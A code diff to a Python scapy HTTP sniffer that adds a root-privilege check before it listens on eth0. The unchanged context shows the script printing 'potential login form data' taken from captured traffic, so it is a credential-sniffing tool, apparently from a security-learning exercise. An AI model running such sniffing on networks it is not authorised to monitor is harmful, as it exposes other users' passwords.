@@ -12,7 +12,14 @@ try:
 except ImportError:
     # If you installed this package via pip, you just need to execute this
     from scapy.layers import http
+import os
 
+def check_root():
+    # check if the script is run as root/admin
+    if os.geteuid() != 0:
+        print("[!] Please run this script with root privileges.")
+        sys.exit(1)
+        
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=packet_processer)
 
@@ -39,4 +46,5 @@ def packet_processer(packet):
                         print(f"\n\n[+] Potential login form data for {url.decode('utf-8')}: {load_str}\n\n")
                         break
 
+check_root()
 sniff("eth0")
